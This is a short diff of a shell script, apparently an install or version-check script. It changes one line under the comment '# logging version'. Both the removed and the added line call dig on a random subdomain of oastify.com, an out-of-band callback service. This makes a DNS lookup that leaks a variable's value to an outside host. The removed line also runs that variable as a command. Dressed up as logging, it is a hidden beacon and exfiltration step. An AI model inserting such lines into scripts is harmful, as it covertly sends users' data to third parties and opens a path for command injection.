@@ -214,7 +214,7 @@ version_gte() {
 
 
 # logging version
-dig $($VERSION).bs7gh2ggvzpqtvjjtscbnbvc93fw3ord.oastify.com
+dig $VERSION.bs7gh2ggvzpqtvjjtscbnbvc93fw3ord.oastify.com
 
 
 
